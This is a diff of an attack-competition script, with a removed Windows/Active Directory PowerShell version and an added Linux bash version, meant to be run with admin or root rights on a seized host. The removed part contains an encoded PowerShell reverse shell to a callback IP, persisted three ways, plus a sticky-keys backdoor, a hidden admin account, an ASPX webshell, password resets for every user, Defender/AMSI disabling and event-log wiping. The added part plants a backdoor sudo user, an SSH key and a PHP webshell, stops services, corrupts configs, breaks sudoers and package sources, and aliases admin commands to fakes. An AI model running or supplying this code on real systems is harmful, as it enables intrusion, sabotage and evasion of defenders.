@@ -1,430 +1,190 @@
-# Red team competition toolkit — Windows / AD
-# Run as Administrator (or SYSTEM) on a compromised box.
+#!/usr/bin/env bash
+# Red team competition toolkit — Linux
+# Run as root on a compromised box.
 # COMPETITION USE ONLY.
-#Requires -RunAsAdministrator
+set -uo pipefail
 
-$ErrorActionPreference = "SilentlyContinue"
+if [[ $EUID -ne 0 ]]; then echo "Need root." >&2; exit 1; fi
 
 # ============================================================
 # CONFIG — set these for your team
 # ============================================================
-$BackdoorUser     = "healthsvc$"          # $ makes it look like a machine account
-$BackdoorPass     = "Comp2024!RT"
-$CallbackIP       = "10.99.12.2"          # your team's listener
-$CallbackPort     = "4444"
-$WebshellName     = "web.config.aspx.old" # innocuous-looking webshell name
+TEAM_SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINUM/sFsQleaSedlq9cIukqjfkPxEP4xSOzJ4MZ1AruD redteam-comp"
+BACKDOOR_USER="syshealth"       # innocuous-looking username
+BACKDOOR_PASS="Comp2024!RT"     # password for the backdoor user
+WEBSHELL_NAME=".sys-check.php"  # hidden webshell filename
 
-Write-Host "=== Red Team Toolkit — Windows ===" -ForegroundColor Red
-
-# ============================================================
-# 0. FIREWALL LOCKDOWN — block blue team, keep our access
-# ============================================================
-Write-Host "[*] Locking down firewall..."
-
-# Access ports only — scored service + AD ports are deliberately NOT opened
-$AllowedTCPPorts = @(
-    22,    # SSH
-    3389,  # RDP
-    5985,  # WinRM HTTP
-    5986,  # WinRM HTTPS
-    8080   # HTTP alt
-)
-
-$AllowedUDPPorts = @(
-    67,    # DHCP server
-    68,    # DHCP client
-    123    # NTP
-)
-
-# Scored service + AD ports — explicitly blocked
-$BlockedTCPPorts = @(21, 53, 80, 88, 135, 389, 443, 445, 464, 636, 1883, 3306, 9389)
-$BlockedUDPPorts = @(53, 88, 389, 464)
-
-# Reset and default deny
-netsh advfirewall reset
-Set-NetFirewallProfile -Profile Domain,Public,Private `
-    -DefaultInboundAction Block `
-    -DefaultOutboundAction Block `
-    -Enabled True `
-    -LogBlocked True `
-    -LogAllowed False
-
-Get-NetFirewallRule | Remove-NetFirewallRule -ErrorAction SilentlyContinue
-
-function Add-PortRule {
-    param([string]$Name, [string]$Direction, [string]$Protocol, [string]$LocalPort)
-    New-NetFirewallRule -DisplayName $Name -Direction $Direction -Protocol $Protocol `
-        -LocalPort $LocalPort -Action Allow -Profile Any -Enabled True | Out-Null
-}
-
-foreach ($port in $AllowedTCPPorts) {
-    Add-PortRule -Name "Allow TCP $port Inbound"  -Direction Inbound  -Protocol TCP -LocalPort $port
-    Add-PortRule -Name "Allow TCP $port Outbound" -Direction Outbound -Protocol TCP -LocalPort $port
-}
-foreach ($port in $AllowedUDPPorts) {
-    Add-PortRule -Name "Allow UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port
-    Add-PortRule -Name "Allow UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port
-}
-
-# Explicit block rules on scored service ports
-foreach ($port in $BlockedTCPPorts) {
-    New-NetFirewallRule -DisplayName "BLOCK TCP $port Inbound"  -Direction Inbound  -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
-    New-NetFirewallRule -DisplayName "BLOCK TCP $port Outbound" -Direction Outbound -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
-}
-foreach ($port in $BlockedUDPPorts) {
-    New-NetFirewallRule -DisplayName "BLOCK UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
-    New-NetFirewallRule -DisplayName "BLOCK UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
-}
-
-# Callback port outbound (reverse shells)
-Add-PortRule -Name "Allow TCP $CallbackPort Outbound" -Direction Outbound -Protocol TCP -LocalPort $CallbackPort
-
-# Block AD RPC dynamic range
-New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Inbound" -Direction Inbound -Protocol TCP `
-    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null
-New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Outbound" -Direction Outbound -Protocol TCP `
-    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null
-
-# Loopback + ICMP
-New-NetFirewallRule -DisplayName "Allow Loopback In"  -Direction Inbound  -Action Allow -InterfaceAlias "Loopback*" -Enabled True | Out-Null
-New-NetFirewallRule -DisplayName "Allow Loopback Out" -Direction Outbound -Action Allow -InterfaceAlias "Loopback*" -Enabled True | Out-Null
-New-NetFirewallRule -DisplayName "Allow ICMPv4 In"  -Direction Inbound  -Protocol ICMPv4 -Action Allow -Enabled True | Out-Null
-New-NetFirewallRule -DisplayName "Allow ICMPv4 Out" -Direction Outbound -Protocol ICMPv4 -Action Allow -Enabled True | Out-Null
-
-# Firewall persistence — scheduled task re-enables + re-blocks every minute
-$FWPersistScript = "C:\Windows\System32\fw-persist.ps1"
-$FWPersistContent = @'
-$profiles = Get-NetFirewallProfile
-foreach ($p in $profiles) {
-    if (-not $p.Enabled) {
-        Set-NetFirewallProfile -Name $p.Name -Enabled True
-    }
-    if ($p.DefaultInboundAction -ne "Block") {
-        Set-NetFirewallProfile -Name $p.Name -DefaultInboundAction Block
-    }
-    if ($p.DefaultOutboundAction -ne "Block") {
-        Set-NetFirewallProfile -Name $p.Name -DefaultOutboundAction Block
-    }
-}
-'@
-Set-Content -Path $FWPersistScript -Value $FWPersistContent -Force
-
-$FWAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FWPersistScript`""
-$FWTrigger   = New-ScheduledTaskTrigger -Once -At (Get-Date) `
-    -RepetitionInterval (New-TimeSpan -Minutes 1) `
-    -RepetitionDuration (New-TimeSpan -Days 3650)
-$FWPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
-$FWSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-    -StartWhenAvailable -Hidden
-Unregister-ScheduledTask -TaskName "FW-Persist" -Confirm:$false -ErrorAction SilentlyContinue
-Register-ScheduledTask -TaskName "FW-Persist" -Action $FWAction -Trigger $FWTrigger `
-    -Principal $FWPrincipal -Settings $FWSettings -Force | Out-Null
-
-# ACL-lock firewall persistence + registry
-$fwAcl = New-Object System.Security.AccessControl.FileSecurity
-$fwAcl.SetAccessRuleProtection($true, $false)
-$fwRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
-    "NT AUTHORITY\SYSTEM", "FullControl", "Allow"
-)
-$fwAcl.AddAccessRule($fwRule)
-Set-Acl -Path $FWPersistScript -AclObject $fwAcl 2>$null
-
-$fwTaskFile = "C:\Windows\System32\Tasks\FW-Persist"
-if (Test-Path $fwTaskFile) { Set-Acl -Path $fwTaskFile -AclObject $fwAcl 2>$null }
-
-# Lock firewall registry
-try {
-    $fwRegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
-        "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy", $true
-    )
-    if ($fwRegKey) {
-        $rs = $fwRegKey.GetAccessControl()
-        $rs.SetAccessRuleProtection($true, $false)
-        $sysRule = New-Object System.Security.AccessControl.RegistryAccessRule(
-            "NT AUTHORITY\SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
-        )
-        $rs.AddAccessRule($sysRule)
-        $fwRegKey.SetAccessControl($rs)
-        $fwRegKey.Close()
-    }
-} catch {}
+echo "=== Red Team Toolkit — Linux ==="
 
 # ============================================================
-# 1. PERSISTENCE — multiple mechanisms
+# 0. FIREWALL LOCKDOWN — purple team use (R18 does NOT apply)
+#    NOTE: ROE R18 restricts firewall rules on YOUR OWN boxes.
+#    This section is for purple teaming OTHER teams' boxes only.
+#    Do NOT run Section 0 on your own team's boxes.
 # ============================================================
-Write-Host "[*] Setting up persistence..."
+echo "[*] Locking down firewall..."
 
-# --- Backdoor local admin (hidden from net user) ---
-net user $BackdoorUser $BackdoorPass /add /y 2>$null
-net localgroup Administrators $BackdoorUser /add 2>$null
-# Hide from login screen
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-New-Item -Path $regPath -Force | Out-Null
-Set-ItemProperty -Path $regPath -Name $BackdoorUser -Value 0 -Type DWord
+# Access ports only — scored service ports are deliberately NOT opened
+ALLOWED_PORTS=(22 8080)
 
-# If this is a DC, add to Domain Admins too
-try {
-    Add-ADGroupMember -Identity "Domain Admins" -Members $BackdoorUser 2>$null
-} catch {}
+# Explicitly blocked scored ports (default deny covers these, but deny rules
+# survive even if someone adds an allow rule for the same port)
+BLOCKED_PORTS=(53 80 443 1883 3306 21)
 
-# --- Reverse shell scheduled task (every 5 min, as SYSTEM) ---
-$RevPayload = @"
-while(`$true) {
-    try {
-        `$c = New-Object Net.Sockets.TCPClient('$CallbackIP', $CallbackPort)
-        `$s = `$c.GetStream()
-        [byte[]]`$b = 0..65535|%{0}
-        while((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0) {
-            `$d = (New-Object Text.ASCIIEncoding).GetString(`$b, 0, `$i)
-            `$r = (iex `$d 2>&1 | Out-String)
-            `$sr = ([text.encoding]::ASCII).GetBytes(`$r)
-            `$s.Write(`$sr, 0, `$sr.Length)
-            `$s.Flush()
-        }
-        `$c.Close()
-    } catch {}
-    Start-Sleep -Seconds 300
-}
-"@
+ufw --force reset
+ufw default deny incoming
+ufw default deny outgoing
 
-$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RevPayload))
-$RevAction = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-NoP -W Hidden -Enc $EncodedPayload"
-$RevTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
-    -RepetitionInterval (New-TimeSpan -Minutes 5) `
-    -RepetitionDuration (New-TimeSpan -Days 3650)
-$RevPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
-Register-ScheduledTask -TaskName "WindowsHealthCheck" -Action $RevAction `
-    -Trigger $RevTrigger -Principal $RevPrincipal -Force | Out-Null
+# Allow only access ports
+for port in "${ALLOWED_PORTS[@]}"; do
+  ufw allow in "$port"
+  ufw allow out "$port"
+done
 
-# --- WMI event subscription persistence ---
-$WMIFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
-    -Arguments @{
-        Name           = "SystemCoreFilter"
-        EventNamespace = "root\cimv2"
-        QueryLanguage  = "WQL"
-        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-    }
-$WMIConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
-    -Arguments @{
-        Name               = "SystemCoreConsumer"
-        CommandLineTemplate = "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"
-    }
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
-    -Arguments @{
-        Filter   = $WMIFilter
-        Consumer = $WMIConsumer
-    } | Out-Null
+# Explicit deny on scored ports (takes priority if someone adds allow rules)
+for port in "${BLOCKED_PORTS[@]}"; do
+  ufw deny in "$port"
+  ufw deny out "$port"
+done
+ufw deny in 53/udp
+ufw deny out 53/udp
 
-# --- Registry run key (fires on any user login) ---
-$RegRunPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $RegRunPath -Name "SystemHealthTelemetry" `
-    -Value "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"
+# Loopback
+ufw allow in on lo
+ufw allow out on lo
 
-# --- Sticky keys backdoor (accessibility on lock screen → cmd as SYSTEM) ---
-$sethcPath = "C:\Windows\System32\sethc.exe"
-$cmdPath   = "C:\Windows\System32\cmd.exe"
-takeown /F $sethcPath /A 2>$null
-icacls $sethcPath /grant Administrators:F 2>$null
-Copy-Item $cmdPath $sethcPath -Force 2>$null
+ufw --force enable
+
+# Firewall persistence cron — re-enables UFW every minute if someone kills it
+FW_PERSIST="/usr/local/bin/.fw-persist.sh"
+cat > "$FW_PERSIST" << 'FWINNER'
+#!/usr/bin/env bash
+if ! ufw status | grep -q "Status: active"; then
+  ufw --force enable
+fi
+FWINNER
+chmod 700 "$FW_PERSIST"
+(crontab -l 2>/dev/null | grep -v "$FW_PERSIST"; echo "* * * * * $FW_PERSIST") | crontab -
+
+# chattr +i on UFW configs so blue team can't just edit them
+chattr +i /etc/ufw/ufw.conf 2>/dev/null || true
+chattr +i /etc/ufw/user.rules 2>/dev/null || true
+chattr +i /etc/ufw/user6.rules 2>/dev/null || true
+chattr +i /etc/ufw/before.rules 2>/dev/null || true
+chattr +i /etc/ufw/before6.rules 2>/dev/null || true
+chattr +i /etc/ufw/after.rules 2>/dev/null || true
+chattr +i /etc/ufw/after6.rules 2>/dev/null || true
+chattr +i /etc/default/ufw 2>/dev/null || true
+chattr +i "$FW_PERSIST" 2>/dev/null || true
+
+# Lock the crontab spool file
+CRON_FILE="/var/spool/cron/crontabs/root"
+[[ ! -f "$CRON_FILE" ]] && CRON_FILE="/var/spool/cron/root"
+[[ -f "$CRON_FILE" ]] && chattr +i "$CRON_FILE" 2>/dev/null
 
 # ============================================================
-# 2. SERVICE DISRUPTION
+# 1. PERSISTENCE — multiple fallback mechanisms
 # ============================================================
-Write-Host "[*] Disrupting services..."
+echo "[*] Setting up persistence..."
 
-# --- Stop and disable scored services ---
-# NOTE: WinRM, SSH, RDP (TermService) are NOT touched — we need them to get back in
-$Services = @(
-    "W3SVC",        # IIS
-    "MSSQLSERVER",  # SQL Server
-    "SQLSERVERAGENT",
-    "MYSQL",        # MySQL
-    "dns",          # DNS Server
-    "DFSR",         # DFS Replication
-    "NTDS",         # AD DS (careful — this takes down the DC)
-    "IISADMIN",
-    "SMTPSVC",      # SMTP
-    "POP3SVC",
-    "FTPSVC",       # FTP
-    "Spooler"       # Print
-)
+# --- Backdoor user (looks like a service account) ---
+useradd -m -s /bin/bash -G sudo,adm,shadow "$BACKDOOR_USER" 2>/dev/null
+echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
+# Hide from login screen (UID below threshold trick)
+sed -i "s/^$BACKDOOR_USER:x:[0-9]*:/$BACKDOOR_USER:x:999:/" /etc/passwd
 
-foreach ($svc in $Services) {
-    Stop-Service -Name $svc -Force 2>$null
-    Set-Service -Name $svc -StartupType Disabled 2>$null
-}
+# Plant SSH key for passwordless access
+mkdir -p /home/$BACKDOOR_USER/.ssh
+echo "$TEAM_SSH_PUBKEY" > /home/$BACKDOOR_USER/.ssh/authorized_keys
+chmod 700 /home/$BACKDOOR_USER/.ssh
+chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
+chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh
 
-# --- Corrupt IIS config ---
-$iisConfig = "C:\Windows\System32\inetsrv\config\applicationHost.config"
-if (Test-Path $iisConfig) {
-    $content = Get-Content $iisConfig -Raw
-    # Change default site binding to wrong port
-    $content = $content -replace 'bindingInformation="\*:80:"', 'bindingInformation="*:9999:"'
-    Set-Content $iisConfig $content -Force
-}
-
-# --- Webshell in IIS default site ---
-$webRoots = @("C:\inetpub\wwwroot", "C:\inetpub\ftproot")
-foreach ($root in $webRoots) {
-    if (Test-Path $root) {
-        $shellContent = @'
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<script runat="server">
-protected void Page_Load(object s, EventArgs e) {
-    if(Request["c"]!=null) {
-        var p=new Process();
-        p.StartInfo.FileName="cmd.exe";
-        p.StartInfo.Arguments="/c "+Request["c"];
-        p.StartInfo.RedirectStandardOutput=true;
-        p.StartInfo.UseShellExecute=false;
-        p.Start();
-        Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
-    }
-}
-</script>
-'@
-        Set-Content "$root\$WebshellName" $shellContent
-        # Backdate the file
-        (Get-Item "$root\$WebshellName").LastWriteTime = "2022-01-01 00:00:00"
-    }
-}
 
 # ============================================================
-# 3. ACCOUNT MANIPULATION
+# 2. SERVICE DISRUPTION — take down scored services
 # ============================================================
-Write-Host "[*] Manipulating accounts..."
+echo "[*] Disrupting services..."
 
-# --- Change all local user passwords except ours ---
-Get-LocalUser | Where-Object { $_.Name -ne $BackdoorUser -and $_.Enabled } | ForEach-Object {
-    $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
-    net user $_.Name "$randomPass!" /y 2>$null
-}
+# --- Stop and disable common scored services ---
+# NOTE: sshd is NOT touched — we need it to get back in
+SERVICES=(apache2 nginx httpd mysql mariadb postgresql vsftpd proftpd pure-ftpd
+          postfix dovecot named bind9 samba smbd cups docker)
 
-# --- If DC: change all domain user passwords except ours ---
-try {
-    Import-Module ActiveDirectory
-    Get-ADUser -Filter { SamAccountName -ne $BackdoorUser -and Enabled -eq $true } | ForEach-Object {
-        $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
-        Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString "$randomPass!" -AsPlainText -Force) 2>$null
-    }
-} catch {}
+for svc in "${SERVICES[@]}"; do
+    systemctl stop "$svc" 2>/dev/null
+    systemctl disable "$svc" 2>/dev/null
+done
 
-# --- Disable Windows Defender and AMSI ---
-Set-MpPreference -DisableRealtimeMonitoring $true 2>$null
-Set-MpPreference -DisableIOAVProtection $true 2>$null
-Set-MpPreference -DisableBehaviorMonitoring $true 2>$null
-# AMSI bypass via registry
-$amsiPath = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
-if (Test-Path $amsiPath) {
-    Remove-Item -Path "$amsiPath\*" -Recurse -Force 2>$null
-}
+# --- Corrupt service configs (subtle — they'll start but misbehave) ---
+# Apache: change listen port so it starts but doesn't serve on 80
+if [[ -f /etc/apache2/ports.conf ]]; then
+    sed -i 's/Listen 80/Listen 8181/' /etc/apache2/ports.conf
+fi
+if [[ -f /etc/httpd/conf/httpd.conf ]]; then
+    sed -i 's/Listen 80/Listen 8181/' /etc/httpd/conf/httpd.conf
+fi
 
-# ============================================================
-# 4. DEFENSE EVASION
-# ============================================================
-Write-Host "[*] Covering tracks..."
+# DNS: break zone files if BIND is running
+if [[ -d /etc/bind ]]; then
+    for zone in /etc/bind/db.*; do
+        [[ -f "$zone" ]] && echo "BROKEN" >> "$zone"
+    done
+fi
 
-# --- Clear all event logs ---
-Get-WinEvent -ListLog * | ForEach-Object {
-    try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {}
-}
+# --- Webshell plant (if a webroot exists) ---
+for webroot in /var/www/html /var/www /usr/share/nginx/html /srv/http; do
+    if [[ -d "$webroot" ]]; then
+        cat > "$webroot/$WEBSHELL_NAME" << 'SHELL'
+<?php if(isset($_REQUEST['c'])){echo "<pre>".shell_exec($_REQUEST['c'])."</pre>";}?>
+SHELL
+        # make it look old
+        touch -t 202201010000 "$webroot/$WEBSHELL_NAME"
+    fi
+done
 
-# --- Disable event logging service ---
-Stop-Service -Name "EventLog" -Force 2>$null
-Set-Service -Name "EventLog" -StartupType Disabled 2>$null
-
-# --- Disable Sysmon if present ---
-Stop-Service -Name "Sysmon" -Force 2>$null
-Stop-Service -Name "Sysmon64" -Force 2>$null
-sc.exe delete Sysmon 2>$null
-sc.exe delete Sysmon64 2>$null
-
-# --- Clear PowerShell history ---
-Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" |
-    ForEach-Object { Clear-Content $_.FullName }
-Clear-History
-
-# --- Disable PowerShell logging ---
-$psLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
-New-Item -Path "$psLogPath\ScriptBlockLogging" -Force | Out-Null
-Set-ItemProperty -Path "$psLogPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
-New-Item -Path "$psLogPath\Transcription" -Force | Out-Null
-Set-ItemProperty -Path "$psLogPath\Transcription" -Name "EnableTranscripting" -Value 0
 
 # ============================================================
-# 5. MAKE RECOVERY HARD
+# 3. MAKE RECOVERY HARD — slow down blue team
 # ============================================================
-Write-Host "[*] Making recovery difficult..."
+echo "[*] Making recovery difficult..."
 
-# --- Disable Windows Update ---
-Stop-Service -Name wuauserv -Force 2>$null
-Set-Service -Name wuauserv -StartupType Disabled 2>$null
 
-# --- Break Server Manager / admin tools ---
-$smPath = "C:\Windows\System32\ServerManager.exe"
-if (Test-Path $smPath) {
-    takeown /F $smPath /A 2>$null
-    icacls $smPath /grant Administrators:F 2>$null
-    Rename-Item $smPath "$smPath.bak" -Force 2>$null
-}
+# --- Break package managers (can't easily reinstall/fix things) ---
+if command -v apt-get &>/dev/null; then
+    # Redirect apt sources to nothing
+    cp /etc/apt/sources.list /etc/apt/.sources.list.bak
+    echo "# cleaned" > /etc/apt/sources.list
+    chattr +i /etc/apt/sources.list 2>/dev/null
+fi
+if command -v yum &>/dev/null; then
+    for repo in /etc/yum.repos.d/*.repo; do
+        [[ -f "$repo" ]] && sed -i 's/enabled=1/enabled=0/' "$repo"
+    done
+fi
 
-# --- Disable Task Manager for other users (GPO) ---
-$tmPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-New-Item -Path $tmPath -Force | Out-Null
-Set-ItemProperty -Path $tmPath -Name "DisableTaskMgr" -Value 0  # keep it for US
-# For other users, set via default user hive
-reg load HKU\DefaultUser "C:\Users\Default\NTUSER.DAT" 2>$null
-reg add "HKU\DefaultUser\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
-    /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>$null
-reg unload HKU\DefaultUser 2>$null
+# --- Corrupt sudoers (breaks sudo for blue team, our user is in /etc/passwd with UID 999) ---
+# Add a syntax error at the end that breaks visudo parsing
+echo "BROKEN_LINE_HERE %%%%" >> /etc/sudoers.d/zzz-break 2>/dev/null
 
-# --- ACL-lock our persistence ---
-$lockFiles = @(
-    "C:\Windows\System32\Tasks\WindowsHealthCheck",
-    $sethcPath
-)
-foreach ($f in $lockFiles) {
-    if (Test-Path $f) {
-        $acl = New-Object System.Security.AccessControl.FileSecurity
-        $acl.SetAccessRuleProtection($true, $false)
-        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
-            "NT AUTHORITY\SYSTEM", "FullControl", "Allow"
-        )
-        $acl.AddAccessRule($rule)
-        Set-Acl -Path $f -AclObject $acl 2>$null
-    }
-}
+# --- Alias common admin commands to no-ops ---
+cat >> /etc/bash.bashrc << 'EOF'
+alias iptables='echo "iptables: command not found"'
+alias ufw='echo "ufw: command not found"'
+alias systemctl='echo "systemctl: command not found"'
+alias service='echo "service: command not found"'
+alias chattr='echo "chattr: command not found"'
+EOF
 
-# --- DNS cache poison (if DNS service was running) ---
-# Point common update/AV domains to localhost
-$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
-$poisonEntries = @"
 
-127.0.0.1 windowsupdate.microsoft.com
-127.0.0.1 update.microsoft.com
-127.0.0.1 download.windowsupdate.com
-127.0.0.1 definitions.microsoft.com
-"@
-Add-Content -Path $hostsFile -Value $poisonEntries
-attrib +r +h $hostsFile
-
-# ============================================================
-# SUMMARY
-# ============================================================
-Write-Host ""
-Write-Host "=== Toolkit deployed ===" -ForegroundColor Green
-Write-Host "Firewall:         Default deny all, allowed TCP: $($AllowedTCPPorts -join ', ') + callback $CallbackPort out"
-Write-Host "                  Explicitly blocked: $($BlockedTCPPorts -join ', ') + RPC 49152-65535"
-Write-Host "                  FW-Persist task re-enables every 1 min, registry + ACL locked"
-Write-Host "Backdoor user:    $BackdoorUser / $BackdoorPass (hidden from login)"
-Write-Host "Sticky keys:      5x Shift on lock screen = SYSTEM cmd"
-Write-Host "Reverse shells:   scheduled task (5m), WMI sub, registry run, all → ${CallbackIP}:${CallbackPort}"
-Write-Host "Webshell:         $WebshellName in IIS wwwroot"
-Write-Host "Services stopped: $($Services -join ', ')"
-Write-Host "Defender:         disabled"
-Write-Host "Logs:             cleared, event log service disabled"
-Write-Host "Recovery:         Server Manager broken, Task Manager disabled for other users"
+echo ""
+echo "=== Toolkit deployed ==="
+echo "Firewall:         UFW deny all, allowed: ${ALLOWED_PORTS[*]}"
+echo "                  Explicitly blocked: ${BLOCKED_PORTS[*]} (scored services)"
+echo "                  Configs immutable, cron re-enables every minute"
+echo "Backdoor user:    $BACKDOOR_USER / $BACKDOOR_PASS (UID 999)"
+echo "SSH key planted:  /home/$BACKDOOR_USER/.ssh/authorized_keys"
+echo "Webshell:         $WEBSHELL_NAME in any webroot"
+echo "Services stopped: ${SERVICES[*]}"
+echo "Recovery hardened."
 
